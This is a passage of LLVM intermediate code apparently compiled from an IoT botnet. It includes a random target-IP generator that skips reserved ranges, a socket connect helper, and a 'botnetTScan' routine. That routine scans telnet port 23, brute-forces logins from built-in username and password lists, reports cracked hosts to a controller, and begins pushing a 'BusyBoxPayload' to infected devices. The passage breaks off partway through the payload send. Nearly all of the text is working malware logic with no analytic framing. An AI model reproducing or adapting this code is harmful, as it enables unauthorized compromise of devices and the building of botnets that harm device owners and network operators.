  %927 = load i8, i8* @GIP.ipState.1, align 1
  %.off733 = add i8 %927, 40
  %928 = icmp ult i8 %.off733, 15
  br i1 %928, label %.critedge.backedge, label %929

; <label>:929:                                    ; preds = %926, %923
  %930 = load i8, i8* @GIP.ipState.0, align 1
  %931 = icmp eq i8 %930, 23
  br i1 %931, label %932, label %935

; <label>:932:                                    ; preds = %929
  %933 = load i8, i8* @GIP.ipState.1, align 1
  %.off732 = add i8 %933, -94
  %934 = icmp ult i8 %.off732, 15
  br i1 %934, label %.critedge.backedge, label %thread-pre-split667

thread-pre-split667:                              ; preds = %932
  %.pr668 = load i8, i8* @GIP.ipState.0, align 1
  br label %935

; <label>:935:                                    ; preds = %thread-pre-split667, %929
  %936 = phi i8 [ %.pr668, %thread-pre-split667 ], [ %930, %929 ]
  %937 = icmp eq i8 %936, -78
  %938 = load i8, i8* @GIP.ipState.1, align 1
  %939 = icmp eq i8 %938, 62
  %or.cond828 = and i1 %937, %939
  br i1 %or.cond828, label %.critedge.backedge, label %940

; <label>:940:                                    ; preds = %935
  %941 = load i8, i8* @GIP.ipState.0, align 1
  %942 = icmp eq i8 %941, 106
  %943 = load i8, i8* @GIP.ipState.1, align 1
  br i1 %942, label %944, label %.thread673.thread

; <label>:944:                                    ; preds = %940
  %.off731 = add i8 %943, 74
  %945 = icmp ult i8 %.off731, 7
  br i1 %945, label %.critedge.backedge, label %946

; <label>:946:                                    ; preds = %944
  %.pr670 = load i8, i8* @GIP.ipState.0, align 1
  %947 = icmp eq i8 %.pr670, 106
  %948 = load i8, i8* @GIP.ipState.1, align 1
  %949 = icmp ugt i8 %948, -73
  %950 = icmp eq i8 %948, 105
  %or.cond584835 = or i1 %949, %950
  %or.cond834 = and i1 %947, %or.cond584835
  br i1 %or.cond834, label %.critedge.backedge, label %.thread673.thread

.thread673.thread:                                ; preds = %946, %940
  %951 = phi i8 [ %941, %940 ], [ %.pr670, %946 ]
  %952 = phi i8 [ %943, %940 ], [ %948, %946 ]
  %953 = icmp eq i8 %951, 34
  br i1 %953, label %954, label %957

; <label>:954:                                    ; preds = %.thread673.thread
  %955 = icmp ult i8 %952, -11
  %956 = icmp eq i8 %952, -1
  %or.cond585 = or i1 %955, %956
  br i1 %or.cond585, label %957, label %.critedge.backedge

; <label>:957:                                    ; preds = %954, %.thread673.thread
  %958 = load i8, i8* @GIP.ipState.0, align 1
  %959 = icmp eq i8 %958, 87
  br i1 %959, label %960, label %963

; <label>:960:                                    ; preds = %957
  %961 = load i8, i8* @GIP.ipState.1, align 1
  %.off730 = add i8 %961, -97
  %962 = icmp ult i8 %.off730, 2
  br i1 %962, label %.critedge.backedge, label %thread-pre-split671

thread-pre-split671:                              ; preds = %960
  %.pr672 = load i8, i8* @GIP.ipState.0, align 1
  br label %963

; <label>:963:                                    ; preds = %thread-pre-split671, %957
  %964 = phi i8 [ %.pr672, %thread-pre-split671 ], [ %958, %957 ]
  %965 = icmp eq i8 %964, 86
  %966 = load i8, i8* @GIP.ipState.1, align 1
  %967 = or i8 %966, 1
  %968 = icmp eq i8 %967, -47
  %or.cond702 = and i1 %965, %968
  br i1 %or.cond702, label %.critedge.backedge, label %969

; <label>:969:                                    ; preds = %963
  %970 = icmp eq i8 %964, -63
  %971 = icmp eq i8 %966, -92
  %or.cond592 = and i1 %970, %971
  br i1 %or.cond592, label %.critedge.backedge, label %972

; <label>:972:                                    ; preds = %969
  %973 = icmp eq i8 %964, 120
  %.off729 = add i8 %966, -103
  %974 = icmp ult i8 %.off729, 5
  %or.cond830 = and i1 %973, %974
  br i1 %or.cond830, label %.critedge.backedge, label %975

; <label>:975:                                    ; preds = %972
  %976 = load i8, i8* @GIP.ipState.0, align 1
  %977 = icmp eq i8 %976, -68
  %978 = load i8, i8* @GIP.ipState.1, align 1
  %979 = icmp eq i8 %978, 68
  %or.cond595 = and i1 %977, %979
  br i1 %or.cond595, label %.critedge.backedge, label %980

; <label>:980:                                    ; preds = %975
  %981 = icmp eq i8 %976, 78
  %982 = icmp eq i8 %978, 46
  %or.cond597 = and i1 %981, %982
  %983 = icmp eq i8 %976, -32
  %or.cond599 = or i1 %983, %or.cond597
  br i1 %or.cond599, label %.critedge.backedge, label %984

; <label>:984:                                    ; preds = %980
  %985 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %985, i8 0, i64 16, i32 16, i1 false)
  %986 = load i8, i8* @GIP.ipState.0, align 1
  %987 = zext i8 %986 to i32
  %988 = load i8, i8* @GIP.ipState.1, align 1
  %989 = zext i8 %988 to i32
  %990 = load i8, i8* @GIP.ipState.2, align 1
  %991 = zext i8 %990 to i32
  %992 = load i8, i8* @GIP.ipState.3, align 1
  %993 = zext i8 %992 to i32
  %994 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %985, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.92, i64 0, i64 0), i32 %987, i32 %989, i32 %991, i32 %993)
  %995 = call i32 @inet_addr(i8* nonnull %985) #6
  ret i32 %995
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @GRIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #15
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #6
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #6
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #6
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #6
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #6
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #2

; Function Attrs: noinline noreturn nounwind uwtable
define void @botnetTScan(i32, i32) local_unnamed_addr #11 {
  %3 = alloca %struct.fd_set, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = tail call i64 @time(i64* null) #6
  %9 = tail call i32 @rand_cmwc()
  %10 = zext i32 %9 to i64
  %11 = xor i64 %10, %8
  %12 = trunc i64 %11 to i32
  tail call void @srand(i32 %12) #6
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 23) #15
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %17 = bitcast i8* %16 to i64*
  store i64 0, i64* %17, align 4
  %18 = tail call noalias i8* @malloc(i64 1025) #6
  tail call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 1025, i32 1, i1 false)
  %19 = zext i32 %1 to i64
  %20 = alloca %struct.telstate_t, i64 %19, align 16
  %21 = bitcast %struct.telstate_t* %20 to i8*
  %22 = alloca i32, i64 %19, align 16
  %23 = sext i32 %1 to i64
  %24 = mul nsw i64 %23, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 %24, i32 16, i1 false)
  %25 = icmp sgt i32 %1, 0
  br i1 %25, label %.lr.ph96.preheader, label %.preheader93.preheader

.lr.ph96.preheader:                               ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph96.prol.loopexit, label %.lr.ph96.prol.preheader

.lr.ph96.prol.preheader:                          ; preds = %.lr.ph96.preheader
  br label %.lr.ph96.prol

.lr.ph96.prol:                                    ; preds = %.lr.ph96.prol.preheader
  %26 = bitcast %struct.telstate_t* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %26, i8 0, i64 32, i32 16, i1 false)
  %27 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 0, i32 3
  store i8 1, i8* %27, align 1
  %28 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 0, i32 9
  store i8* %18, i8** %28, align 8
  br label %.lr.ph96.prol.loopexit

.lr.ph96.prol.loopexit:                           ; preds = %.lr.ph96.preheader, %.lr.ph96.prol
  %indvars.iv97.unr = phi i64 [ 0, %.lr.ph96.preheader ], [ 1, %.lr.ph96.prol ]
  %29 = icmp eq i32 %1, 1
  br i1 %29, label %.preheader93.preheader.loopexit, label %.lr.ph96.preheader.new

.lr.ph96.preheader.new:                           ; preds = %.lr.ph96.prol.loopexit
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96, %.lr.ph96.preheader.new
  %indvars.iv97 = phi i64 [ %indvars.iv97.unr, %.lr.ph96.preheader.new ], [ %indvars.iv.next98.1, %.lr.ph96 ]
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv97
  %31 = bitcast %struct.telstate_t* %30 to i8*
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 32, i32 16, i1 false)
  %32 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv97, i32 3
  store i8 1, i8* %32, align 1
  %33 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv97, i32 9
  store i8* %18, i8** %33, align 8
  %indvars.iv.next98 = add nuw nsw i64 %indvars.iv97, 1
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next98
  %35 = bitcast %struct.telstate_t* %34 to i8*
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 32, i32 16, i1 false)
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next98, i32 3
  store i8 1, i8* %36, align 1
  %37 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next98, i32 9
  store i8* %18, i8** %37, align 8
  %indvars.iv.next98.1 = add nsw i64 %indvars.iv97, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next98.1, %wide.trip.count
  br i1 %exitcond.1, label %.preheader93.preheader.loopexit.unr-lcssa, label %.lr.ph96

.preheader93.preheader.loopexit.unr-lcssa:        ; preds = %.lr.ph96
  br label %.preheader93.preheader.loopexit

.preheader93.preheader.loopexit:                  ; preds = %.lr.ph96.prol.loopexit, %.preheader93.preheader.loopexit.unr-lcssa
  br label %.preheader93.preheader

.preheader93.preheader:                           ; preds = %.preheader93.preheader.loopexit, %2
  br label %.preheader93

.preheader93:                                     ; preds = %.preheader93.preheader, %.preheader93
  %indvars.iv = phi i64 [ %indvars.iv.next, %.preheader93 ], [ 0, %.preheader93.preheader ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %38 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %indvars.iv.next
  %39 = load i8*, i8** %38, align 8
  %40 = icmp eq i8* %39, null
  br i1 %40, label %.preheader, label %.preheader93

.preheader:                                       ; preds = %.preheader93
  %41 = icmp sgt i32 %1, 0
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %div = lshr i32 %1, 1
  %43 = zext i32 %div to i64
  %44 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %41, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %46 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %47 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 0
  %48 = sext i32 %0 to i64
  %49 = bitcast i32* %6 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %281
  %.194 = phi i32 [ %.mux, %281 ], [ 0, %.lr.ph.preheader ]
  %50 = sext i32 %.194 to i64
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 7
  %53 = load i32, i32* %52, align 16
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %.lr.ph
  %56 = call i64 @time(i64* null) #6
  %57 = trunc i64 %56 to i32
  store i32 %57, i32* %52, align 16
  br label %58

; <label>:58:                                     ; preds = %55, %.lr.ph
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 2
  %60 = load i8, i8* %59, align 8
  switch i8 %60, label %281 [
    i8 0, label %61
    i8 1, label %103
    i8 2, label %137
    i8 3, label %157
    i8 4, label %175
    i8 5, label %195
    i8 6, label %215
    i8 7, label %260
  ]

; <label>:61:                                     ; preds = %58
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 3
  %63 = load i8, i8* %62, align 1
  switch i8 %63, label %84 [
    i8 1, label %64
    i8 0, label %71
  ]

; <label>:64:                                     ; preds = %61
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 9
  %66 = bitcast i8** %65 to i64*
  %67 = load i64, i64* %66, align 8
  %68 = bitcast %struct.telstate_t* %51 to i8*
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 32, i32 16, i1 false)
  store i64 %67, i64* %66, align 8
  %69 = call i32 @GIP()
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 1
  store i32 %69, i32* %70, align 4
  br label %84

; <label>:71:                                     ; preds = %61
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 5
  %73 = load i8, i8* %72, align 1
  %74 = add i8 %73, 1
  store i8 %74, i8* %72, align 1
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 4
  %76 = load i8, i8* %75, align 2
  %77 = add i8 %76, 1
  store i8 %77, i8* %75, align 2
  %78 = zext i8 %74 to i64
  %79 = icmp eq i64 %78, %43
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %71
  store i8 1, i8* %62, align 1
  br label %281

; <label>:81:                                     ; preds = %71
  %82 = icmp eq i8 %77, 0
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %81
  store i8 1, i8* %62, align 1
  br label %281

; <label>:84:                                     ; preds = %61, %81, %64
  store i16 2, i16* %13, align 4
  store i16 %14, i16* %15, align 2
  store i64 0, i64* %17, align 4
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 1
  %86 = load i32, i32* %85, align 4
  store i32 %86, i32* %42, align 4
  %87 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 0, i32 0
  store i32 %87, i32* %88, align 16
  %89 = icmp eq i32 %87, -1
  br i1 %89, label %281, label %90

; <label>:90:                                     ; preds = %84
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %87, i32 3, i8* null) #6
  %92 = or i32 %91, 2048
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %87, i32 4, i32 %92) #6
  %94 = load i32, i32* %88, align 16
  %95 = call i32 @connect(i32 %94, %struct.sockaddr* nonnull %46, i32 16) #6
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %102

; <label>:97:                                     ; preds = %90
  %98 = tail call i32* @__errno_location() #15
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 115
  br i1 %100, label %102, label %101

; <label>:101:                                    ; preds = %97
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:102:                                    ; preds = %97, %90
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 1)
  br label %281

; <label>:103:                                    ; preds = %58
  %104 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %47) #6, !srcloc !7
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 0, i32 0
  %106 = load i32, i32* %105, align 16
  %107 = srem i32 %106, 64
  %108 = zext i32 %107 to i64
  %109 = shl i64 1, %108
  %110 = sdiv i32 %106, 64
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %111
  %113 = load i64, i64* %112, align 8
  %114 = or i64 %109, %113
  store i64 %114, i64* %112, align 8
  store i64 0, i64* %44, align 8
  store i64 %48, i64* %45, align 8
  %115 = load i32, i32* %105, align 16
  %116 = add nsw i32 %115, 1
  %117 = call i32 @select(i32 %116, %struct.fd_set* null, %struct.fd_set* nonnull %3, %struct.fd_set* null, %struct.timeval* nonnull %4) #6
  switch i32 %117, label %130 [
    i32 1, label %118
    i32 -1, label %129
  ]

; <label>:118:                                    ; preds = %103
  store i32 4, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %119 = load i32, i32* %105, align 16
  %120 = call i32 @getsockopt(i32 %119, i32 1, i32 4, i8* nonnull %49, i32* nonnull %5) #6
  %121 = load i32, i32* %6, align 4
  %122 = icmp eq i32 %121, 0
  br i1 %122, label %124, label %123

; <label>:123:                                    ; preds = %118
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:124:                                    ; preds = %118
  %125 = load i32, i32* %105, align 16
  %126 = call i32 (i32, i32, ...) @fcntl(i32 %125, i32 3, i8* null) #6
  %127 = and i32 %126, -2049
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %125, i32 4, i32 %127) #6
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 2)
  br label %281

; <label>:129:                                    ; preds = %103
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:130:                                    ; preds = %103
  %131 = load i32, i32* %52, align 16
  %132 = add i32 %131, 5
  %133 = zext i32 %132 to i64
  %134 = call i64 @time(i64* null) #6
  %135 = icmp slt i64 %133, %134
  br i1 %135, label %136, label %281

; <label>:136:                                    ; preds = %130
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:137:                                    ; preds = %58
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 0, i32 0
  %139 = load i32, i32* %138, align 16
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 9
  %141 = load i8*, i8** %140, align 8
  %142 = call i32 @read_until_response(i32 %139, i32 %0, i8* %141, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i64 0, i64 0))
  %143 = icmp eq i32 %142, 0
  br i1 %143, label %150, label %144

; <label>:144:                                    ; preds = %137
  %145 = load i8*, i8** %140, align 8
  %146 = call i32 @contains_fail(i8* %145)
  %147 = icmp eq i32 %146, 0
  br i1 %147, label %149, label %148

; <label>:148:                                    ; preds = %144
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 0)
  br label %281

; <label>:149:                                    ; preds = %144
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 3)
  br label %281

; <label>:150:                                    ; preds = %137
  %151 = load i32, i32* %52, align 16
  %152 = add i32 %151, 7
  %153 = zext i32 %152 to i64
  %154 = call i64 @time(i64* null) #6
  %155 = icmp slt i64 %153, %154
  br i1 %155, label %156, label %281

; <label>:156:                                    ; preds = %150
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:157:                                    ; preds = %58
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 0, i32 0
  %159 = load i32, i32* %158, align 16
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 4
  %161 = load i8, i8* %160, align 2
  %162 = zext i8 %161 to i64
  %163 = getelementptr inbounds [0 x i8*], [0 x i8*]* @usernames, i64 0, i64 %162
  %164 = load i8*, i8** %163, align 8
  %165 = call i64 @strlen(i8* %164) #14
  %166 = call i64 @send(i32 %159, i8* %164, i64 %165, i32 16384) #6
  %167 = icmp slt i64 %166, 0
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %157
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:169:                                    ; preds = %157
  %170 = load i32, i32* %158, align 16
  %171 = call i64 @send(i32 %170, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.93, i64 0, i64 0), i64 2, i32 16384) #6
  %172 = icmp slt i64 %171, 0
  br i1 %172, label %173, label %174

; <label>:173:                                    ; preds = %169
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:174:                                    ; preds = %169
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 4)
  br label %281

; <label>:175:                                    ; preds = %58
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 0, i32 0
  %177 = load i32, i32* %176, align 16
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 9
  %179 = load i8*, i8** %178, align 8
  %180 = call i32 @read_until_response(i32 %177, i32 %0, i8* %179, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i64 0, i64 0))
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %188, label %182

; <label>:182:                                    ; preds = %175
  %183 = load i8*, i8** %178, align 8
  %184 = call i32 @contains_fail(i8* %183)
  %185 = icmp eq i32 %184, 0
  br i1 %185, label %187, label %186

; <label>:186:                                    ; preds = %182
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 0)
  br label %281

; <label>:187:                                    ; preds = %182
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 5)
  br label %281

; <label>:188:                                    ; preds = %175
  %189 = load i32, i32* %52, align 16
  %190 = add i32 %189, 3
  %191 = zext i32 %190 to i64
  %192 = call i64 @time(i64* null) #6
  %193 = icmp slt i64 %191, %192
  br i1 %193, label %194, label %281

; <label>:194:                                    ; preds = %188
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:195:                                    ; preds = %58
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 0, i32 0
  %197 = load i32, i32* %196, align 16
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 5
  %199 = load i8, i8* %198, align 1
  %200 = zext i8 %199 to i64
  %201 = getelementptr inbounds i32, i32* %22, i64 %200
  %202 = load i32, i32* %201, align 4
  %203 = sext i32 %202 to i64
  %204 = inttoptr i64 %203 to i8*
  %205 = call i64 @strlen(i8* %204) #14
  %206 = call i64 @send(i32 %197, i8* %204, i64 %205, i32 16384) #6
  %207 = icmp slt i64 %206, 0
  br i1 %207, label %208, label %209

; <label>:208:                                    ; preds = %195
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:209:                                    ; preds = %195
  %210 = load i32, i32* %196, align 16
  %211 = call i64 @send(i32 %210, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.93, i64 0, i64 0), i64 2, i32 16384) #6
  %212 = icmp slt i64 %211, 0
  br i1 %212, label %213, label %214

; <label>:213:                                    ; preds = %209
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:214:                                    ; preds = %209
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 6)
  br label %281

; <label>:215:                                    ; preds = %58
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 9
  %219 = load i8*, i8** %218, align 8
  %220 = call i32 @read_until_response(i32 %217, i32 %0, i8* %219, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %253, label %222

; <label>:222:                                    ; preds = %215
  %223 = call i64 @time(i64* null) #6
  %224 = trunc i64 %223 to i32
  store i32 %224, i32* %52, align 16
  %225 = load i8*, i8** %218, align 8
  %226 = call i32 @contains_fail(i8* %225)
  %227 = icmp eq i32 %226, 0
  br i1 %227, label %229, label %228

; <label>:228:                                    ; preds = %222
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 0)
  br label %281

; <label>:229:                                    ; preds = %222
  %230 = load i8*, i8** %218, align 8
  %231 = call i32 @contains_success(i8* %230)
  %232 = icmp eq i32 %231, 0
  br i1 %232, label %252, label %233

; <label>:233:                                    ; preds = %229
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 3
  %235 = load i8, i8* %234, align 1
  %236 = icmp eq i8 %235, 2
  br i1 %236, label %237, label %238

; <label>:237:                                    ; preds = %233
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 7)
  br label %281

; <label>:238:                                    ; preds = %233
  %239 = load i32, i32* @switchCommStock, align 4
  %240 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %51)
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 4
  %242 = load i8, i8* %241, align 2
  %243 = zext i8 %242 to i64
  %244 = getelementptr inbounds [0 x i8*], [0 x i8*]* @usernames, i64 0, i64 %243
  %245 = load i8*, i8** %244, align 8
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %50, i32 5
  %247 = load i8, i8* %246, align 1
  %248 = zext i8 %247 to i64
  %249 = getelementptr inbounds i32, i32* %22, i64 %248
  %250 = load i32, i32* %249, align 4
  %251 = call i32 (i32, i8*, ...) @botnetPrint(i32 %239, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.94, i64 0, i64 0), i8* %240, i8* %245, i32 %250)
  call void @advance_state(%struct.telstate_t* nonnull %51, i32 7)
  br label %281

; <label>:252:                                    ; preds = %229
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:253:                                    ; preds = %215
  %254 = load i32, i32* %52, align 16
  %255 = add i32 %254, 7
  %256 = zext i32 %255 to i64
  %257 = call i64 @time(i64* null) #6
  %258 = icmp slt i64 %256, %257
  br i1 %258, label %259, label %281

; <label>:259:                                    ; preds = %253
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:260:                                    ; preds = %58
  %261 = call i64 @time(i64* null) #6
  %262 = trunc i64 %261 to i32
  store i32 %262, i32* %52, align 16
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 0, i32 0
  %264 = load i32, i32* %263, align 16
  %265 = call i64 @send(i32 %264, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i64 0, i64 0), i64 4, i32 16384) #6
  %266 = load i32, i32* %263, align 16
  %267 = call i64 @send(i32 %266, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.96, i64 0, i64 0), i64 7, i32 16384) #6
  %268 = load i32, i32* %263, align 16
  %269 = load i8*, i8** @BusyBoxPayload, align 8
  %270 = call i64 @strlen(i8* %269) #14
  %271 = call i64 @send(i32 %268, i8* %269, i64 %270, i32 16384) #6
  %272 = icmp slt i64 %271, 0
